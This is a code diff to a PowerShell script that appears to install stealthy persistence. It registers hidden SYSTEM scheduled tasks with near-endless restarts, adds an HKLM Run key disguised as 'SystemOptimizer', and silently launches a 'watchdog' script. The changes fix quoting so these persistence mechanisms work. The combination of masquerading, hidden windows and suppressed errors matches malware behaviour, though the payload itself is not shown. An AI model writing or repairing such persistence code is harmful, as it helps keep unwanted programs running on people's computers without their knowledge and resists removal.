@@ -136,9 +136,12 @@ $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccou
 $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden -ExecutionTimeLimit ([TimeSpan]::Zero) -RestartCount 999999 -RestartInterval (New-TimeSpan -Minutes 1)
 Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger1,$trigger2 -Principal $principal -Settings $settings -Force -ErrorAction SilentlyContinue
 Register-ScheduledTask -TaskName "$taskName-Logon" -Action $action -Trigger $trigger2 -Principal $principal -Settings $settings -Force -ErrorAction SilentlyContinue
-# Registry Run key backup (HKLM, uses Set-ItemProperty for correct quoting)
-try { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SystemOptimizer" -Value "wscript.exe `"`"$wdPath`""`"" -Force -ErrorAction SilentlyContinue } catch { }
+# Registry Run key backup (HKLM, correct quoting)
+try {
+    $regValue = 'wscript.exe "' + $wdPath + '"'
+    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SystemOptimizer" -Value $regValue -Force -ErrorAction SilentlyContinue
+} catch { }
 
 # ===== START WATCHDOG NOW (hidden) =====
 $wshell = New-Object -ComObject WScript.Shell
-$wshell.Run("wscript.exe `"" + $watchdogPath + "`"", 0, $false)
+$wshell.Run('wscript.exe "' + $watchdogPath + '"', 0, $false)
